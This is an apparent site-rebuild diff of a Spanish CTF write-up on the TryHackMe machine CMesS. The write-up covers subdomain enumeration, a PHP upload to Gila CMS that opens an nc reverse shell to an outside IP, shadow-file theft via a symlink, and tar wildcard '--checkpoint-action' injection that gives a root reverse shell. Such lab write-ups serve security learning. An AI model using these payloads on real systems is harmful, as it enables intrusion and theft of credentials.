@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="CMesS es una maquina de TryHackMe, realizamos una enumeracion de subdominios para encontrar credenciales para Gila CMS, subir una shell inversa y obtener acceso. Realizamos movimiento lateral utilizando una contraseña dentro de un backup. Encontramos un cronjob que realiza backups con Tar, utilizamos wildcards para ejecutar una shell inversa como root.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.92.2" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1657,7 +1657,7 @@
 <p>Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1679,7 +1679,7 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Fri Feb 14 16:24:08 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.46.144</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Fri Feb 14 16:24:08 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.46.144</span>
 Nmap scan report <span class="k">for</span> 10.10.46.144
 Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
 Not shown: <span class="m">65533</span> closed ports
@@ -1708,7 +1708,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Encontramos una larga lista de directorios, pero ninguno era de importancia hasta el momento.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1750,7 +1750,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/cmess# gobuster dir -u cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t <span class="m">35</span> 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/cmess# gobuster dir -u cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t <span class="m">35</span> 
 /1 <span class="o">(</span>Status: 200<span class="o">)</span>
 /about <span class="o">(</span>Status: 200<span class="o">)</span>
 /01 <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1792,11 +1792,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 /00000001 <span class="o">(</span>Status: 200<span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="wfuzz---subdomains-">WFUZZ - SUBDOMAINS</h2>
+</div><h2 id="wfuzz---subdomains">WFUZZ - SUBDOMAINS</h2>
 <p>Utilizamos wfuzz para poder enumerar los subdominios de la maquina, encontramos <code>***</code> de subdominio.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1827,7 +1827,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/cmess# wfuzz -c -w subdomains-top1mil-5000.txt -u <span class="s2">&#34;http://cmess.thm&#34;</span> -H <span class="s2">&#34;Host: FUZZ.cmess.thm&#34;</span> --hl <span class="m">107</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/cmess# wfuzz -c -w subdomains-top1mil-5000.txt -u <span class="s2">&#34;http://cmess.thm&#34;</span> -H <span class="s2">&#34;Host: FUZZ.cmess.thm&#34;</span> --hl <span class="m">107</span>
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="err">&#39;</span>s documentation <span class="k">for</span> more information.
 
@@ -1865,13 +1865,13 @@ Requests/sec.: 38.07726
 <p>Utilizamos las credenciales en el panel de administracion (/admin) con las credenciales que tenemos, una vez dentro subimos un archivo PHP de prueba para verificar que podamos ejecutar comandos, el archivo se subió en (/assets/).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> 
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
 
 <span class="k">echo</span> <span class="s2">&#34;Testing if i can run commands:&#34;</span><span class="p">;</span>
 <span class="k">echo</span><span class="p">(</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;ls &#34;</span><span class="p">));</span>
@@ -1883,12 +1883,12 @@ Requests/sec.: 38.07726
 <p>Editamos el codigo para ejecutar una shell inversa:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> 
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
 <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 7878 &gt;/tmp/f&#34;</span><span class="p">);</span>
 <span class="k">echo</span> <span class="s2">&#34;&gt;:)&#34;</span><span class="p">;</span>
 </code></pre></td></tr></table>
@@ -1898,7 +1898,7 @@ Requests/sec.: 38.07726
 <p>Enumeramos la maquina en busca de archivos interesantes, en la carpeta /opt encontramos un backup de la contraseña de Andre.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1913,7 +1913,7 @@ Requests/sec.: 38.07726
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@cmess:/$ ls -lah opt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@cmess:/$ ls -lah opt
 ls -lah opt
 total 12K
 drwxr-xr-x  <span class="m">2</span> root root 4.0K Feb  <span class="m">6</span> 18:54 .
@@ -1939,7 +1939,7 @@ www-data@cmess:/opt$
 <p>De la misma forma podemos obtener la contraseña del usuario root (crackeada) haciendo un symlink hacia la carpeta /etc/.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1960,7 +1960,7 @@ www-data@cmess:/opt$
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">andre@cmess:~$ ln -s /etc/ backup
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">andre@cmess:~$ ln -s /etc/ backup
 andre@cmess:~$ ls -lah
 total 3.0M
 drwxr-x--- <span class="m">4</span> andre andre 4.0K Feb <span class="m">14</span> 18:27 .
@@ -1984,7 +1984,7 @@ andre@cmess:~$
 </div><p>Descomprimimos el archivo y obtenemos la contraseña encriptada:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2022,7 +2022,7 @@ andre@cmess:~$
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">andre@cmess:/tmp$ ls <span class="p">|</span>grep sha
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">andre@cmess:/tmp$ ls <span class="p">|</span>grep sha
 gshadow
 gshadow-
 shadow
@@ -2064,12 +2064,12 @@ andre@cmess:/tmp$
 <p>Para obtener una shell con el usuario root utilizamos las &lsquo;wildcards&rsquo; para ejecutar una shell inversa. Creamos un archivo con nuestra shell inversa y las &lsquo;wildcards&rsquo; que se ejecutarán junto con el comando tar:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 8989 &gt;/tmp/f&#34;</span> &gt; shell.sh
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 8989 &gt;/tmp/f&#34;</span> &gt; shell.sh
 <span class="nb">echo</span> <span class="s2">&#34;&#34;</span>&gt; <span class="s2">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
 <span class="nb">echo</span> <span class="s2">&#34;&#34;</span>&gt; --checkpoint<span class="o">=</span><span class="m">1</span>
 </code></pre></td></tr></table>
@@ -2077,12 +2077,12 @@ andre@cmess:/tmp$
 </div><p>Verificamos:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">andre@cmess:~/backup$ ls
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">andre@cmess:~/backup$ ls
 --checkpoint<span class="o">=</span><span class="m">1</span>  --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>sh shell.sh  shell.sh
 andre@cmess:~/backup$
 </code></pre></td></tr></table>
@@ -2095,7 +2095,7 @@ andre@cmess:~/backup$
 <p>Dentro de la configuracion de la pagina vemos las credenciales para conectarse a la base de datos, encontramos algunas tablas interesantes pero ningun dato nos ayudo para ninguno de los usuarios.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2135,7 +2135,7 @@ andre@cmess:~/backup$
 </span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@cmess:/var/www/html$ cat config.php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@cmess:/var/www/html$ cat config.php
 cat config.php
 &lt;?php
 
@@ -2178,7 +2178,7 @@ cat config.php
 </div><p>Utilizamos las credenciales con mysql, y en la tabla users de la base de datos gila encontramos la contraseña encriptada del usuario andre, ademas de eso encontramos las cookies del usuario andre:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2234,7 +2234,7 @@ cat config.php
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; show databases<span class="p">;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; show databases<span class="p">;</span>
 show databases<span class="p">;</span>
 +--------------------+
 <span class="p">|</span> Database           <span class="p">|</span>
@@ -2581,7 +2581,7 @@ mysql&gt; <span class="k">select</span> * from usermeta<span class="p">;</span>
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3699,7 +3699,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#http">HTTP</a>
       <ul>
         <li><a href="#gobuster">GOBUSTER</a></li>
-        <li><a href="#wfuzz---subdomains-">WFUZZ - SUBDOMAINS</a></li>
+        <li><a href="#wfuzz---subdomains">WFUZZ - SUBDOMAINS</a></li>
         <li><a href="#cmessthm">***.cmess.thm</a></li>
       </ul>
     </li>
